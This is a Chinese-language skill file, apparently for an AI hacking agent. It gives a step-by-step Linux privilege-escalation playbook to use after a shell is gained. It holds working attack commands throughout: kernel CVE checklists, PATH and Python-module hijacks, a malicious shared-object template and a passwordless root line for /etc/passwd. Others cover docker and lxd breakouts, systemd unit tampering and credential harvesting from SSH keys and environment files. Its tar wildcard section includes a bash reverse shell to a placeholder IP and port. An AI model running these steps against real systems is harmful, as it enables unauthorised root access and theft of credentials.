---
name: 'linux-privesc'
description: 'Linux 提权技能：2026 通杀 CVE（Copy Fail/Dirty Frag）+ 容器检测 + 8 阶段检查表'
whenToUse: '拿到 Linux shell 后提权：2026 通杀 CVE + 容器检测 + 8 阶段检查表。'
metadata: { domain: linux, tier: T1 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# Linux 提权技能

> 🔴 **不自动加载。拿 shell 后调用 `加载技能 linux-privesc`，先读此索引匹配场景。**

## 快速索引

| 场景 | 跳转 |
|------|------|
| 刚拿 shell，什么都不知道 | §0 容器检测 (必须先做) → §7 自动化 (linpeas) |
| 内核版本已知 | §1 通杀 CVE: Copy Fail (4.14-7.0) / Dirty Frag (4.x-6.x) / OverlayFS |
| `sudo -l` 有结果 | §2 Sudo: CVE-2026-53225 / 已知 sudo 二进制绕过 |
| 有 capabilities | §3 Capabilities 滥用 |
| 有 SUID 二进制 | §4 SUID: 共享库劫持 / PATH 劫持 / 通配符 |
| 有 cron/systemd timer | §5 Cron/Systemd Timer 劫持 |
| 有可写目录/文件 | §6 文件权限: /etc/passwd / authorized_keys / NFS |
| 有 MySQL/PostgreSQL root | §8 数据库提权 |
| 是容器环境 | → 加载 `container-escape` |
| 是 snap/flatpak/firejail | → 加载 `noncontainer-sandbox-escape` |
| 内核太新无已知 CVE | §7 linpeas → 全量枚举 → §6 文件权限是最稳定的路径 |

## 0. 容器环境检测（拿 shell 第一毫秒！）

```
[ ] cat /proc/1/cgroup 2>/dev/null | grep -E 'docker|lxc|kubepods'
[ ] ls -la /.dockerenv 2>/dev/null
[ ] id | grep -E "docker|lxd|lxc"
[ ] mount | grep overlay
→ 命中 → 🔴 你在容器内！加载 container-escape skill

🆕 非容器沙箱 — 同样第一秒就查！
[ ] snap list 2>/dev/null && echo "⚠️ SNAP → noncontainer-sandbox-escape"
[ ] flatpak list 2>/dev/null && echo "⚠️ FLATPAK → noncontainer-sandbox-escape"
[ ] firejail --list 2>/dev/null && echo "⚠️ FIREJAIL → noncontainer-sandbox-escape"
[ ] find / -perm -4000 -type f 2>/dev/null | grep -q snap-confine && echo "⚠️ snap-confine SUID → noncontainer-sandbox-escape"
→ 命中 → 加载 noncontainer-sandbox-escape 记忆
```

## 1. 2026 通杀内核提权（优先！）

```
[ ] 🔴 前提: cat /proc/sys/kernel/unprivileged_userns_clone  → 必须为 1
    如果为 0 且有 root 权限可: sysctl kernel.unprivileged_userns_clone=1
    如果为 0 且无 root → 内核提权不可行，跳过本阶段

[ ] uname -r → Linux kernel 4.14-7.0? (since 2017, 几乎所有现代发行版)
[ ] CVE-2026-31431 "Copy Fail": AF_ALG algif_aead + splice 覆写 page cache
    └─ 覆写 /usr/bin/su 的 in-memory 副本 → root
    └─ GitHub: 4xura/CVE-2026-31431-Copy-Fail
    └─ Metasploit 已出模块
    └─ 🔴 范围: kernel 4.14 → 7.0-rc (2017年至今的所有主流发行版)

[ ] CVE-2026-43284 "Dirty Frag" (xfrm-ESP): IPsec page-cache write
[ ] CVE-2026-43500 "Dirty Frag" (RxRPC): /etc/passwd 覆写
[ ] CVE-2026-46300 "Fragnesia" (ESP-in-TCP): Dirty Frag 变体，绕过初版补丁
    └─ 检测: ochebotar/copy-fail-CVE-2026-31431-detection-probe

[ ] 🆕 内核版本在 2015-2021 区间? → 先试 OverlayFS CVE-2021-3493 / CVE-2023-0386
    检测: unshare -rm sh -c "echo ok" 2>&1 | grep -q ok && echo "VULN: user_ns available"
    不熟版本匹配 → 用 linux-exploit-suggester 自动匹配内核 CVE
```

## 2. 基础信息
```
[ ] id; whoami; uname -a; cat /etc/os-release
[ ] pkexec --version 2>/dev/null                 # PwnKit CVE-2021-4034 (几乎所有旧发行版)
[ ] env; cat /proc/1/environ | tr '\0' '\n'     # 🔴 环境变量第一站！
[ ] sudo -V | head -1
```

## 3. 快速提权
```
[ ] sudo -l                                       # 🔴 最优先！→ 每条 sudo 规则去 GTFOBins 查！
[ ] 🔴 sudo -l 输出含 SETENV: → PYTHONPATH / PERL5LIB 变量注入！
    sudo PYTHONPATH=/tmp/ /allowed/script.py   # 在 /tmp/ 放同名 import 的 .py
[ ] sudo -V | head -1                             # 🔴 版本号！sudo ≤1.9.12p2 → CVE-2023-22809 sudoedit
                                                  # sudo ≤1.8.28 → CVE-2019-14287 uid=-1 绕过
[ ] 🔴 sudo -l 输出含 env_keep+= → LD_PRELOAD / BASH_ENV / PYTHONPATH → 库劫持 (见 §9.6)
[ ] getcap -r / 2>/dev/null → 🔴 优先查: cap_setuid+ep / cap_sys_admin+ep / cap_chown+ep / cap_dac_override+ep / cap_fowner+ep
# cap_setuid+ep → python3/perl → setuid(0); exec("/bin/bash")
# cap_sys_admin+ep → mount 任意操作 / nsenter 容器逃逸
# cap_chown+ep → chown root:root /bin/bash → chmod +s /bin/bash
# cap_dac_override+ep → 直接读写 /etc/shadow
# cap_fowner+ep → chmod 4755 /bin/bash (改 SUID 位!)
[ ] find / -perm -4000 -type f 2>/dev/null        # SUID → 🔴 每个 binary 去 GTFOBins 查！
[ ] find / -perm -2000 -type f 2>/dev/null        # SGID → 检查组权限
[ ] crontab -l; cat /etc/crontab; systemctl list-timers
[ ] 🆕 每个 root timer/cron 脚本 → cat 读源码 → 找 os.path.join / git ls-tree / subprocess
[ ] cat /etc/exports                               # NFS no_root_squash (见 §9.9)
[ ] id | grep -E "docker|lxd|disk|adm"             # 🔴 高危组！(见 §9.7)
```

## 4. 进程 & 服务
```
[ ] ps aux; ss -ntlp                              # 内网服务（尤其 127.0.0.1）
[ ] 🔴 localhost 服务快速检查:
    ss -ltnp | grep 127.0.0.1 → 每个端口都是独立攻击面
    25151 → Cobbler XMLRPC (CVE-2024-47533)
    54321 → Python eval 注入
    2375 → Docker API
    9092 → Kafka broker
    3000 → 🆕 Gitea 本地实例 → 检查 template-sync / cron 脚本
[ ] 🔴 ipa 二进制存在 → freeipa-pentesting — 这是 FreeIPA 环境
[ ] strings /dev/mem -n10 2>/dev/null | grep -i pass
[ ] 🔴 pspy — 无 root 权限监控进程: ./pspy64 -pf -i 1000  # 观察 cron/timer 实际执行了什么命令
[ ] 🆕 systemctl list-timers → 每个 root timer → cat 对应脚本 → 找: os.path.join, git ls-tree, subprocess, shutil.copy
```

## 5. 文件 & 目录
```
[ ] find / -writable -type f 2>/dev/null | grep -v proc
[ ] find / -name "*.env" -o -name "*.conf" -o -name "*.bak" -o -name "*.old" 2>/dev/null | grep -v proc
[ ] grep -r "password\|secret\|key" /etc/ /opt/ /var/ 2>/dev/null | head -20
[ ] find / -name ".git" -type d 2>/dev/null                   # 🔴 Git 仓库 → git log / git diff 找凭据
[ ] cat ~/.docker/config.json 2>/dev/null                     # 🔴 Docker registry 凭据 (base64)
[ ] cat ~/.git-credentials 2>/dev/null                        # 🔴 Git 凭据存储
[ ] find / -type f -name "id_rsa" -o -name "*.pem" 2>/dev/null # SSH 私钥
[ ] cat /etc/passwd /etc/shadow 2>/dev/null                   # 🔴 检查是否可写！
    → passwd 可写 → echo "root2::0:0:root:/root:/bin/bash" >> /etc/passwd → su root2
    → shadow 可写 → openssl passwd -1 newpass → 替换 root 的 hash
```

## 6. 已安装软件
```
[ ] dpkg -l; rpm -qa
[ ] 每个版本号 → searchsploit
[ ] 🔴 优先级: sudo > polkit > snapd > Docker
```

## 7. 已知 CVE 对照
```
🔴 2026: Copy Fail (CVE-2026-31431), Dirty Frag (CVE-2026-43284), Fragnesia (CVE-2026-46300)
🔴 OverlayFS: CVE-2021-3493 (Ubuntu 20.04/21.04), CVE-2023-0386 (Ubuntu 22.04/22.10)
经典: PwnKit (CVE-2021-4034), Baron Samedit (CVE-2021-3156), DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)
🆕 Cobbler: CVE-2024-47533 (localhost:25151 XMLRPC unauth → root)
🆕 Xvfb: 检测 display :99 → xwd -root -out screen.xwd → 屏幕截图提权
🆕 udisks2: CVE-2025-6019 (XFS resize race → SUID shell)
🆕 PAM: CVE-2025-6018 (.pam_environment → allow_active bypass)
🆕 Sudo: CVE-2025-32463 (<1.9.16), CVE-2023-22809 (sudoedit ≤1.9.12p2)
```

## 8. 密码 & 凭据
```
[ ] env; cat /proc/1/environ | tr '\0' '\n'
[ ] ~/.bash_history; /root/.bash_history
[ ] ~/.ssh/id_rsa; /root/.ssh/id_rsa
[ ] 🔴 每个密码 → 试 SSH / sudo / su
```

## 9. 🆕 SUID / Cron 利用链（HTB 经典提权）

### 9.1 SUID Binary 分析
```
# 找到 SUID binary 后，不是直接放弃 — 分析它做了什么
strings /path/to/suid_binary                          # 看它调了哪些命令
strace /path/to/suid_binary 2>&1 | grep execve        # 看实际 exec 调用
ltrace /path/to/suid_binary 2>&1 | grep -E "system|exec|popen"

🔴 关键模式: binary 调了不带绝对路径的命令 → PATH 劫持
🔴 关键模式: binary 是 Python 脚本 → 库劫持
🔴 关键模式: binary 在可写目录执行 tar/tar.gz 操作 → wildcard 注入
```

### 9.2 PATH 劫持
```
# 条件: SUID binary 调了不带绝对路径的命令 (如 cat / id / backup)
# 利用: 在 PATH 前面放恶意同名文件

echo '#!/bin/bash' > /tmp/cat
echo '/bin/bash -p' >> /tmp/cat                    # -p 保留 SUID 权限
chmod +x /tmp/cat
export PATH=/tmp:$PATH
/path/to/suid_binary                                # 以 root 执行 → spawn root shell

# 常见目标命令: cat, id, ls, cp, mv, tar, gzip, systemctl, service, backup, cleanup
```

### 9.3 Python 库劫持
```
# 条件: root cron 或 SUID binary 执行 python3 /path/to/script.py
# 且你对 script 所在目录有写权限

# 在 script 目录放同名 .py 劫持 import
# 目标 import os / import random / import subprocess → 放 os.py / random.py

echo 'import os; os.system("cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash")' \
  > /path/to/script_dir/os.py

# Python 优先搜索当前脚本目录 → 先于系统库加载
# 🔴 验证: python3 -c "import sys; print(sys.path)" → 看搜索顺序
```

### 9.4 Wildcard 注入（cron 用 tar 备份）
```
# 条件: cron 在可写目录执行 tar cf /backup/xxx.tar * (不带 --)
# 利用: 创建文件名为 tar 选项的文件

touch -- --checkpoint=1
touch -- --checkpoint-action=exec=/bin/bash

# 或更隐蔽:
echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' > /tmp/rev.sh
chmod +x /tmp/rev.sh
touch -- --checkpoint=1
touch -- "--checkpoint-action=exec=sh /tmp/rev.sh"

# 🔴 检测: ls -la | grep '^-'  → 文件名以 - 开头说明已有注入痕迹
# 🔴 防御侧: tar cf backup.tar ./* (用 ./* 而非 * 避免 -- 文件)
```

### 9.5 常见 SUID 利用速查
```
# SUID find    → find . -exec /bin/bash -p \; -quit
# SUID python  → python -c 'import os; os.execl("/bin/bash","bash","-p")'
# SUID bash    → /bin/bash -p
# SUID less    → less /etc/passwd → 按 ! → /bin/bash
# SUID vim     → vim → :!bash
# SUID systemctl → 创建恶意 service → systemctl start
# SUID cp/mv   → 覆盖 /etc/passwd /etc/sudoers
# SUID tar     → tar cf - /etc/shadow 2>/dev/null | tar xf - -O
```

### 9.6 Shared Object / Library 劫持
```
# 条件: SUID binary → ldd 确认 + 依赖路径可写 或 LD_PRELOAD env_keep

# ① 找缺失的 .so (最理想)
ldd /path/to/suid_binary | grep "not found"
# → 在 PATH 中任意可写目录放恶意 .so → binary 自动加载

# ② 找依赖的 .so，检查其目录是否可写
ldd /path/to/suid_binary
# → 任意 .so 所在目录可写 → 替换为恶意 .so

# 恶意 .so 模板 (libhijack.c):
#   #include <stdlib.h>
#   void __attribute__((constructor)) hijack() {
#     setuid(0); setgid(0);
#     system("cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash");
#   }
# 编译: gcc -shared -fPIC -o libhijack.so libhijack.c

# ③ LD_PRELOAD (sudo -l 含 env_keep+=LD_PRELOAD)
# 同上恶意 .so → sudo LD_PRELOAD=/tmp/libhijack.so /allowed/command
```

### 9.7 Groups Abuse（高危组成员利用）
```
# 🔴 Writable Docker socket (不需要 docker 组!)
[ ] ls -la /var/run/docker.sock 2>/dev/null
    → 可写 → docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host bash
    → 🔴 等价于 root！不依赖 docker 组，只要 socket 本身可写

# docker 组 → 容器逃逸 → 宿主机 root
docker run -v /:/mnt --rm -it alpine chroot /mnt bash

# lxd 组 → 创建特权容器 → mount 宿主机 FS
# 攻击机: git clone https://github.com/saghul/lxd-alpine-builder && cd lxd-alpine-builder && ./build-alpine
# 传到目标: lxc image import alpine.tar.gz --alias alpine
#   lxc init alpine privesc -c security.privileged=true
#   lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
#   lxc start privesc && lxc exec privesc /bin/sh
#   → /mnt/root 就是宿主机根目录！

# disk 组 → 直接读磁盘 → debugfs /dev/sda1 (仅 ext*, XFS 用 xfs_db)
#   → 绕过文件权限读任意文件

# adm 组 → 读 /var/log 所有日志 → /var/log/auth.log 可能有 ssh 密码
#   用户输密码时误敲在用户名框 → 明文密码留在 auth.log

# 🆕 screen/tmux 残留 session (attached 即 root)
screen -ls 2>/dev/null; tmux ls 2>/dev/null
# → screen -x root/ 或 tmux attach → 直接拿到 root shell
```

### 9.8 systemd Service / Timer 劫持
```
# 条件: 可写 root systemd service 或 timer 文件 (/etc/systemd/system/ 或 /usr/lib/systemd/system/)

# ① 列出 timer → 找到 timer 对应的 service
systemctl list-timers --all
#   → 目标: /usr/lib/systemd/system/some-backup.timer
#   → 查 .timer 内容: cat /usr/lib/systemd/system/some-backup.timer → OnCalendar / Unit

# ② 如果可写 .service 或 .timer 中的 Unit:
#   echo '#!/bin/bash' > /tmp/pwn.sh
#   echo '/bin/bash -c "cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash"' >> /tmp/pwn.sh
#   chmod +x /tmp/pwn.sh

#   修改 .service 中的 ExecStart= 指向 /tmp/pwn.sh
#   → timer 触发 → 以 root 执行 → /tmp/bash -p

# ③ 如果自己的 service 目录可写 (~/.config/systemd/user/)
#   → 创建 user service 然后在权限允许的 range 内执行
#   但普通 user service 不能提权 (以自身用户运行)

# 🔴 优先检查: /etc/systemd/system/*.service → 是否 www-data/普通用户可写
# 🔴 HTB 经典: cron 间接调 systemctl start → service 文件中 ExecStart 可写
```

### 9.9 NFS no_root_squash
```
# 条件: cat /etc/exports 有 no_root_squash + 攻击机可达 NFS

# 攻击机以 root 挂载
mount -t nfs -o rw,vers=3 <NFS_SERVER>:/export /mnt/nfs

# 投放 SUID bash → 目标机执行 /mnt/nfs/bash -p 即得 root
cp /bin/bash /mnt/nfs/bash && chmod 4755 /mnt/nfs/bash

# 🔴 如果 exports 限制 IP 段 → 检查跳板机/VPN 是否在允许段内
```

## 快速优先级
| 优先级 | 项 | 命令 |
|--------|----|------|
| 🔴 0 | 容器检测 | `cat /proc/1/cgroup` → container-escape |
| 🔴 1 | 2026 通杀 | `unshare` 先决 + `uname -r` → Copy Fail / Dirty Frag / OverlayFS |
| 🔴 2 | sudo | `sudo -l` → GTFOBins + `sudo -V` 版本 CVE + env_keep |
| 🔴 3 | env | `env; cat /proc/1/environ` |
| 🔴 4 | capabilities | `getcap -r /` → GTFOBins |
| 🔴 5 | SUID/SGID | `find / -perm -4000` → GTFOBins + `ldd` 库劫持 |
| 🔴 6 | 高危组 | `id` → docker/lxd/disk/adm |
| 🔴 7 | cron/systemd | `crontab -l; systemctl list-timers` + pspy + 查可写 service 文件 |
| 🔴 8 | NFS | `cat /etc/exports` → no_root_squash |
| 🟠 9 | 进程 | `ps aux; ss -ntlp` |
| 🔵 10 | 软件 | `dpkg -l` → searchsploit |
